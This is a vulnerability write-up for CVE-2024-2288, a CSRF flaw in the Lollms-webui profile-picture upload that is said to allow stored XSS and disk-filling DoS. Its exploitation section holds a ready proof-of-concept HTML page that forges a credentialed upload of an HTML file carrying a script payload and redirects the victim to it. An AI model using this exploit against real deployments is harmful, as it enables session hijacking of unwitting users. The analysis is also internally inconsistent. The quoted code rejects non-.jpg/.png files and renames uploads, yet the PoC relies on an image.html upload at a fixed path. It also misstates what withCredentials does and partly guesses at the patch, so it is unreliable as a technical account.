"### CVE-2024-2288: Detailed Report\n\n#### 1. **Summary of the CVE and Vulnerability**\n\n**Vulnerability Type**:  \n- **CWE-352**: Cross-Site Request Forgery (CSRF)\n\n**Affected Version**:  \n- Lollms-webui versions up to **7.3.0**. The issue is fixed in version **9.3**.\n\n**Description**:  \nA CSRF vulnerability exists in the profile picture upload functionality in the Lollms web application (parisneo/lollms-webui repository). This vulnerability allows an attacker to trick a user into uploading a malicious file (e.g., an HTML file) as their profile picture, which may then lead to a stored cross-site scripting (XSS) attack in the victim's browser. The attacker can exploit this vulnerability to inject and execute arbitrary JavaScript code, effectively compromising the victim's session within the web application. In addition to this, the attacker can use the CSRF vulnerability to overload the filesystem with continuous file uploads, potentially causing a denial of service (DoS).\n\n#### 2. **Root Cause of the Vulnerability**\n\nThe root cause of the vulnerability lies in the **lack of CSRF protection** in the profile picture upload functionality. This is exacerbated by the fact that there is no validation to confirm that the requests for uploading files (avatars) originate from an expected source (i.e., from the legitimate application frontend). Without any CSRF protection or proper validation, an attacker can forge a request to the upload endpoint on behalf of a user, causing the user to upload an arbitrary file.\n\nIn terms of **code**, the vulnerability resides in the following part of the application where the file upload takes place:\n\n```python\n@router.post(\"/upload_avatar\")\nasync def upload_avatar(avatar: UploadFile = File(...)):\n    if avatar.filename.endswith((\".jpg\", \".png\")):\n        random_filename = str(uuid.uuid4())\n        extension = os.path.splitext(avatar.filename)[1]\n        file_location = os.path.join(lollmsElfServer.lollms_paths.personal_user_infos_path, f\"{random_filename}{extension}\")\n        \n        try:\n            img = Image.open(avatar.file)\n            img.save(file_location)\n        except Exception as e:\n            raise HTTPException(status_code=400, detail=\"Invalid image file.\")\n    else:\n        raise HTTPException(status_code=400, detail=\"Invalid file type.\")\n        \n    return {\"status\": True,\"fileName\": f\"{random_filename}{extension}\"}\n```\n\nThe above code only checks for file extensions (`.jpg`, `.png`) but doesn't verify the file's content type or check if the request is legitimate (i.e., coming from the valid frontend). Hence, an attacker can forge a request to this endpoint using CSRF, forcing a victim to upload an image that is actually an HTML file containing malicious JavaScript.\n\nAdditionally, there is no **anti-CSRF token** to prevent unauthorized requests. This absence allows an attacker to manipulate the user into sending a malicious POST request.\n\n#### 3. **Exploitation of the Vulnerability**\n\nTo exploit the CSRF vulnerability, an attacker can craft a malicious HTML page (as shown in the Proof of Concept below) that forces a victim to submit a POST request to the `/upload_avatar` endpoint. When the victim visits the page, their browser will automatically send the malicious request, uploading a malicious file (e.g., `image.html`) to the server without the victim's consent.\n\n**Proof of Concept**:\n```html\n<html>\n  <body>\n    <script>\n      function submitRequest() {\n        var xhr = new XMLHttpRequest();\n        xhr.open(\"POST\", \"http://localhost:9600/upload_avatar\", true);\n        xhr.setRequestHeader(\"Content-Type\", \"multipart/form-data; boundary=---------------------------7469129296923044552541602996\");\n        xhr.withCredentials = true;\n        var body = \"-----------------------------7469129296923044552541602996\\r\\n\" +\n          \"Content-Disposition: form-data; name=\\\"avatar\\\"; filename=\\\"image.html\\\"\\r\\n\" +\n          \"Content-Type: application/html\\r\\n\" +\n          \"\\r\\n\" +\n          \"<img src=x onerror=alert('CSRF')>\\n\" +\n          \"\\r\\n\" +\n          \"-----------------------------7469129296923044552541602996--\\r\\n\";\n        var aBody = new Uint8Array(body.length);\n        for (var i = 0; i < aBody.length; i++)\n          aBody[i] = body.charCodeAt(i);\n        xhr.send(new Blob([aBody]));\n      }\n      submitRequest();\n      window.location.href = \"http://localhost:9600/user_infos/image.html\";\n    </script>\n    <form action=\"#\">\n      <input type=\"button\" value=\"Submit request\" onclick=\"submitRequest();\" />\n    </form>\n  </body>\n</html>\n```\n\n**Explanation**:\n- The attacker crafts a POST request to upload a file (`image.html`) containing JavaScript code (`<img src=x onerror=alert('CSRF')>`). This JavaScript will be executed once the file is uploaded.\n- The `withCredentials = true` ensures that the victim's session cookies are sent along with the request, allowing the attacker to bypass the same-origin policy.\n- Once the file is uploaded, the attacker redirects the victim's browser to the uploaded malicious image (`http://localhost:9600/user_infos/image.html`), causing the XSS payload to execute and trigger an alert in the victim's browser.\n\n**Impact**:\n1. **Profile Picture Change**: The attacker can force the victim to upload a file of their choosing, which can be used for various malicious purposes, such as conducting an XSS attack.\n2. **Denial of Service (DoS)**: By repeatedly uploading large files, the attacker can overwhelm the file system, potentially causing a denial of service.\n3. **Stored XSS**: If the uploaded file contains a script (as in the PoC), it will execute in the victim's browser when they access the uploaded image, leading to XSS. This can be exploited to steal session cookies or perform actions on behalf of the victim.\n\n#### 4. **Patch and Fix**\n\nThe vulnerability was addressed in version **9.3** of the Lollms application, which includes several fixes:\n\n1. **Anti-CSRF Token**: The server now validates CSRF tokens to ensure that requests are coming from legitimate sources.\n2. **Content-Type Validation**: The server now properly validates the content type of the uploaded files.\n3. **Improved CORS Handling**: The frontend and backend communication was modified to ensure that only legitimate requests with the correct headers are accepted.\n\n**Patch Details**:\n- In version 9.3, additional checks and validation mechanisms were implemented to ensure that only valid files are uploaded and that CSRF attacks are mitigated.\n  \nFor example, the patch may include adding an anti-CSRF token to the file upload process, or introducing stricter validation of the `Content-Type` and `Origin` headers to avoid unauthenticated requests from external domains.\n\n#### Conclusion\n\nCVE-2024-2288 exposes a significant security flaw in Lollms-webui versions up to 7.3.0, allowing CSRF attacks that could lead to XSS and DoS attacks. The root cause was the lack of CSRF protection and insufficient validation during file upload. The issue was addressed in version 9.3 with fixes including CSRF token implementation and enhanced file upload checks."